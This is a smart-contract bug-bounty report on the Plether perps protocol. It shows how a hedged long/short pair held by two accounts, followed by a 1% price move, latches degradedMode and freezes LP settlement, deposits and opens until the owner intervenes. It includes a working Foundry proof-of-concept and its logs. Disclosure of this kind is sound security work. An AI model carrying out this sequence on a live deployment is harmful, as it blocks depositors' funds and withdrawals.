# \#97763 [SC-High] An untrusted zero-net-exposure hedged pair latches `degradedMode` on a ~1% move; LP settlement, deposits and new opens then stay blocked until the owner clears it, even after the book is flat and solvent

**Submitted on Nov 3rd 2026 at 02:11:47 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97763
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

After every close or liquidation the engine checks `E < L` (`E` = pool assets minus trader claims, `L` = the larger of the two sides' max profit). If true it latches `degradedMode`, and `settleLpEpoch` then reverts with `HousePool__DegradedMode` until the owner calls `clearDegradedMode`. Because `L` is a **max** of the two sides, a long and a short of equal size use the pool capacity only once. An attacker with two accounts can therefore fill the pool to about 99.7% `L/E` with zero net exposure. A ~1% price move and closing only the winning leg is then enough to push `E` below `L`. No real deficit exists (the losing leg's unrealised loss is simply not counted in `E`). The latch also stays after the attacker leaves and the book is flat and solvent. There is no permissionless way out.

The spec does document the latch as a containment latch that only the owner clears (`ACCOUNTING_SPEC.md:1201-1236`). This report does not claim otherwise. The new part is that an untrusted account can trigger it cheaply with no deficit, and that the block outlives the cause.

### Plain Summary (how the bug is triggered, in short steps)

1. The pool has an honest balanced book at low utilisation (150k long / 150k short, ~15%).
2. The attacker uses **two accounts**: one opens 849k LONG, the other 849k SHORT. Net exposure is zero. Every open passes the normal `E >= L + B` check, and `L/E` reaches ~99.7%.
3. The price moves **1%** in either direction.
4. The attacker closes **only the winning leg**. The winner's payout leaves the pool, so `E` drops. The losing leg's unrealised loss is not in `E`, and `L` does not drop. Now `E < L`, so `degradedMode` latches.
5. From now on LP settlement, new LP deposits, new opens and withdrawals of traders with live positions all revert. Closes and liquidations still work.
6. The attacker closes the losing leg and leaves. The book is flat and solvent, but the latch stays. Hourly settles keep reverting (168 of 168 in 7 days). Only the owner's `clearDegradedMode` unlocks it.

### Vulnerability Details

1. The latch is set from a max-profit bound, not from a realised loss:

```solidity
// CfdEngine.sol:1351-1369 (checks at :1320 and :1344, called after close / liquidation)
@>  // sets degradedMode when E < L, where L = max(longMaxProfit, shortMaxProfit)
```

2. The open gate lets a hedged pair reach `L/E` ~99.75%, because `L` is a max (the pair is counted once):

```solidity
// CfdEnginePlanLib.sol:740-776, SolvencyAccountingLib.sol:93-104
@>  // opens require E >= L + B
```

3. When the winning leg closes, its profit leaves the pool (`E` falls). The opposite leg's unrealised loss is not in `E`. If the winner is not the larger side, `L` does not fall. So `E < L` after a ~1% move at `L/E` ~99.7%.

4. The latch blocks the LP side, and only the owner can undo it:

```solidity
// HousePool.sol:832, :1864-1869   settleLpEpoch reverts HousePool__DegradedMode
// HousePool.sol:490, :1139-1144   deposits blocked
// OrderLiquidationBatchLogic.sol:328   new opens blocked
// CfdEngineSettlementSidecar.sol:274   withdraw with a live position blocked
// CfdEngine.sol:658-667                clearDegradedMode (owner only, reverts StillInsolvent while E < L)
```

5. Nothing clears the latch when the cause is gone. After the attacker exits and the book is flat (`L = 0`, `E` about 1.007M USDG), the latch is still set and 168 of 168 hourly `settleLpEpoch` calls revert.

Threshold (balanced hedged book, ~1.0M USDG pool, from my local tests): at `L/E` 99.7% a 0.9% move latches, at 99% it needs 1.75%, at 90% it needs 12%, and at 50% or below it cannot latch. Both directions work: the +1% case latches the same way (hole 1,478 USDG).

### Impact Details

**Griefing: no funds are lost and the attacker makes no profit, but the LP side of the protocol is blocked for all users until the owner acts.**

While `degradedMode` is latched:
- `settleLpEpoch` reverts, so LP redeem requests are not funded and pending deposits are not activated.
- New LP deposits, new opens, and withdrawals of traders with a live position revert.
- The block stays after the attacker leaves and the book is flat and solvent. Only the owner's `clearDegradedMode` unlocks it.
- The owner cannot clear it while the attacker keeps the losing leg open (`StillInsolvent`). The owner must first recapitalise the hole, which was ~1.6k USDG on a ~1.0M USDG pool, and a second hedged winner can latch it again.

PoC numbers (local Foundry suite, real router flows, MockPyth for the out-of-scope price feed):

| | Value |
|---|---|
| `L/E` before the move | 9,970 bps (99.7%) |
| `E` / `L` after the winning leg closes at -1% | 997,381 / 999,000 USDG |
| Hole `L - E` | 1,618.95 USDG |
| Hourly settles over 7 days on a flat book | 168 / 168 revert |
| LP equity left in the pool | 1,007,224.53 USDG |

### Mitigation

Any one of these closes it:

- Add a permissionless `clearDegradedMode` path that works when the raw check `E >= L` holds (for example, once the book is flat or the losing leg is closed).
- Do not latch from a max-profit bound after a hedged winner close. Latch only when a real shortfall exists (claims plus realised loss exceed pool assets).
- Raise the open gate so a hedged pair cannot reach `L/E` ~99.7% (for example, count both sides toward capacity).

### References

- `packages/perps/src/CfdEngine.sol:1351-1369` (`_enterDegradedModeIfInsolvent`), `:1320`, `:1344`: latch on `E < L`
- `packages/perps/src/CfdEngine.sol:658-667`: `clearDegradedMode` (owner only)
- `packages/perps/src/CfdEnginePlanLib.sol:740-776`, `packages/perps/src/SolvencyAccountingLib.sol:93-104`: open gate `E >= L + B`
- `packages/perps/src/HousePool.sol:832`, `:1864-1869`: `settleLpEpoch` reverts in degraded mode
- `packages/perps/src/HousePool.sol:490`, `:1139-1144`: deposits blocked
- `packages/perps/src/OrderLiquidationBatchLogic.sol:328`: new opens blocked
- `packages/perps/src/CfdEngineSettlementSidecar.sol:274`: live-position withdraw blocked
- `packages/perps/ACCOUNTING_SPEC.md:1201-1236`, `:619-620`; `packages/perps/SECURITY.md:1506-1510`: documented latch and runbook
- Related known item: LOW-73 (protection while degraded) is a different behaviour

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/poc/DegradedLatchHedged.t.sol` and run `forge test --root packages/perps --match-path test/poc/DegradedLatchHedged.t.sol -vv`. It reuses the repo's `BasePerpTest` fixture (full stack: engine, HousePool, vaults, router, mock Pyth for the out-of-scope oracle feed) with the release risk parameters.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

/// @notice PoC: an untrusted, zero-net-exposure hedged pair latches `degradedMode` on a ~1% move; LP settlement,
///         deposits and new opens stay blocked until the owner calls `clearDegradedMode`, even after the book is flat.
///         Release risk params (vpi 0.01, maxSkew 0.4, maint 10 bps, init 20 bps, exec fee 4 bps, buffer 25 bps).
contract PoCDegradedLatchHedged is BasePerpTest {

    address internal constant CAROL = address(0xCA201); // honest long
    address internal constant BOB = address(0xB0B); // honest short
    address internal constant ATK_L = address(0xA7001); // attacker account 1 (long)
    address internal constant ATK_S = address(0xA7003); // attacker account 2 (short)
    address internal constant KEEPER = address(0xE0EC);
    address internal constant LP2 = address(0x1B0002);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.orderSettlementWindow = config.maxExecutionWindowSeconds;
        _setRouterConfig(config);
        router.updateMarkPrice(_px(1e8, 0));
    }

    // ------------------------------------------------------------ helpers
    function _px(uint256 price, uint64 prev) internal returns (bytes[] memory data) {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), prev);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _trade(address acct, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 price) internal {
        vm.prank(acct);
        uint64 oid = router.commitOrder(side, size, margin, 0, isClose);
        (IOrderRouterAccounting.PendingOrderView memory pv,) = router.getPendingOrderView(oid);
        bytes[] memory d = _px(price, pv.commitTime);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(oid, d);
        require(r.terminalReason == OrderV3Types.TerminalReason.Executed, "trade not executed");
    }

    function _closeAll(address acct, uint256 price) internal {
        (uint256 sz,,,, CfdTypes.Side side,,) = engine.positions(acct);
        if (sz == 0) return;
        _trade(acct, side, sz, 0, true, price);
    }

    /// @dev hedged pair of `tokens` per side, laddered in <=250k chunks so every step respects maxSkewRatio
    function _hedge(address l, address s, uint256 tokens, uint256 marginBps) internal {
        uint256 done;
        while (done < tokens) {
            uint256 step = tokens - done < 250_000 ? tokens - done : 250_000;
            uint256 m = (step * 1e6 * marginBps) / 10_000 + 10e6;
            _trade(l, CfdTypes.Side.LONG, step * 1e18, m, false, 1e8);
            _trade(s, CfdTypes.Side.SHORT, step * 1e18, m, false, 1e8);
            done += step;
        }
    }

    function _E() internal view returns (uint256) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return p > c ? p - c : 0;
    }

    function _atkBal() internal view returns (uint256) {
        return clearinghouse.balanceAssets(ATK_L) + clearinghouse.balanceAssets(ATK_S)
            + settlementToken.balanceOf(ATK_L) + settlementToken.balanceOf(ATK_S);
    }

    function _log(string memory tag) internal view {
        uint256 e = _E();
        uint256 l = _maxLiability();
        console2.log("----", tag);
        console2.log("  E (pool assets - claims) USDG", e / 1e6);
        console2.log("  L (max side maxProfit)   USDG", l / 1e6);
        console2.log("  L/E bps", e == 0 ? 0 : (l * 10_000) / e);
        console2.log("  degradedMode", engine.degradedMode());
    }

    // ------------------------------------------------------------ PoC
    function test_PoC_hedgedWinnerCloseLatchesDegradedMode() public {
        // 1. Honest balanced book: 150k long / 150k short (~15% of a ~1.0M USDG pool).
        _fundTrader(CAROL, 10_000e6);
        _fundTrader(BOB, 10_000e6);
        _trade(CAROL, CfdTypes.Side.LONG, 150_000e18, 3_000e6, false, 1e8);
        _trade(BOB, CfdTypes.Side.SHORT, 150_000e18, 3_000e6, false, 1e8);

        // 2. Attacker (2 accounts, zero net exposure) opens long 849k + short 849k. L = max(side) so the pair uses
        //    the capacity once; L/E goes to ~99.7%. Every open passes the normal E >= L + B gate.
        _fundTrader(ATK_L, 25_000e6);
        _fundTrader(ATK_S, 25_000e6);
        uint256 atkStart = _atkBal();
        _hedge(ATK_L, ATK_S, 849_000, 200);
        _log("1) honest book + attacker hedge opened");
        assertFalse(engine.degradedMode(), "must not be latched yet");

        // 3. An honest junior LP has a redeem request waiting (cooldown passed).
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        router.updateMarkPrice(_px(1e8, 0));
        uint256 shares = juniorVault.maxRequestRedeem(address(this));
        uint256 rid = juniorVault.requestRedeem(shares / 10, address(this), address(this));

        // 4. Price moves -1% (USD weaker/stronger, either direction works). Attacker closes the WINNING leg only.
        router.updateMarkPrice(_px(0.99e8, 0));
        _closeAll(ATK_L, 0.99e8);
        _log("2) after attacker closes the winning leg at -1%");
        assertTrue(engine.degradedMode(), "degradedMode must latch");
        console2.log("  hole L - E (USDG atoms)", _maxLiability() - _E());

        // 5. Everything LP-side / entry-side is now blocked.
        (bool ok,) = address(pool).call(abi.encodeCall(pool.settleLpEpoch, (0, 0)));
        assertFalse(ok, "LP settle must revert");
        settlementToken.mint(LP2, 10_000e6);
        vm.startPrank(LP2);
        settlementToken.approve(address(juniorVault), 10_000e6);
        try juniorVault.requestDeposit(10_000e6, LP2, LP2) returns (uint256) {
            revert("deposit should be blocked");
        } catch {}
        vm.stopPrank();
        _fundTrader(LP2, 5_000e6);
        vm.prank(LP2);
        try router.commitOrder(CfdTypes.Side.LONG, 1_000e18, 100e6, 0, false) returns (uint64) {
            revert("open should be blocked");
        } catch {}

        // 6. Owner cannot clear while the attacker keeps the losing leg open.
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        // 7. Attacker holds the loser 24h, then exits fully; the honest traders close too -> book is FLAT.
        vm.warp(vm.getBlockTimestamp() + 1 days);
        router.updateMarkPrice(_px(0.99e8, 0));
        _closeAll(ATK_S, 0.99e8);
        _closeAll(CAROL, 0.99e8);
        _closeAll(BOB, 0.99e8);
        uint256 atkEnd = _atkBal();
        _log("3) book flat, attacker fully out");
        assertEq(_maxLiability(), 0, "book not flat");
        assertTrue(engine.degradedMode(), "latch must persist");
        console2.log("  attacker cost incl. 24h carry (USDG atoms)", atkStart > atkEnd ? atkStart - atkEnd : 0);
        console2.log("  attacker gain (USDG atoms)", atkEnd > atkStart ? atkEnd - atkStart : 0);

        // 8. Keepers try every hour for 7 days: all 168 settles revert with HousePool__DegradedMode; LP gets nothing.
        uint256 reverts;
        for (uint256 h; h < 168; ++h) {
            vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 5);
            vm.prank(KEEPER);
            try pool.settleLpEpoch(0, 0) {}
            catch (bytes memory err) {
                assertEq(bytes4(err), IHousePool.HousePool__DegradedMode.selector, "unexpected revert");
                reverts++;
            }
        }
        console2.log("  settle attempts reverted over 7 days (of 168)", reverts);
        assertEq(reverts, 168);
        assertEq(juniorVault.claimableRedeemRequest(rid, address(this)), 0, "LP redeem was funded");
        console2.log("  LP equity stuck in pool (USDG atoms)", pool.totalAssets());

        // 9. Only the owner call unlocks it.
        engine.clearDegradedMode();
        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 5);
        pool.settleLpEpoch(0, 0);
        console2.log("  LP claimable after owner clear", juniorVault.claimableRedeemRequest(rid, address(this)));
        assertGt(juniorVault.claimableRedeemRequest(rid, address(this)), 0, "still frozen");
    }

}
```

Result (actually run, `forge test --root packages/perps --match-path test/fpcheck_degradedlatch/PoC_DegradedLatchHedged.t.sol -vv`, same test body):

```
Ran 1 test for test/fpcheck_degradedlatch/PoC_DegradedLatchHedged.t.sol:PoCDegradedLatchHedged
[PASS] test_PoC_hedgedWinnerCloseLatchesDegradedMode() (gas: 32893815)
Logs:
  ---- 1) honest book + attacker hedge opened
    E (pool assets - claims) USDG 1002000
    L (max side maxProfit)   USDG 999000
    L/E bps 9970
    degradedMode false
  ---- 2) after attacker closes the winning leg at -1%
    E (pool assets - claims) USDG 997381
    L (max side maxProfit)   USDG 999000
    L/E bps 10016
    degradedMode true
    hole L - E (USDG atoms) 1618950035
  ---- 3) book flat, attacker fully out
    E (pool assets - claims) USDG 1007224
    L (max side maxProfit)   USDG 0
    L/E bps 0
    degradedMode true
    attacker cost incl. 24h carry (USDG atoms) 5993677825
    attacker gain (USDG atoms) 0
    settle attempts reverted over 7 days (of 168) 168
    LP equity stuck in pool (USDG atoms) 1007224525896
    LP claimable after owner clear 100000913208338

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 51.45ms (44.04ms CPU time)
```

The last number is the junior vault's claimable redeem amount in share units. It was 0 for the whole 7 days and only became non-zero after the owner called `clearDegradedMode`.

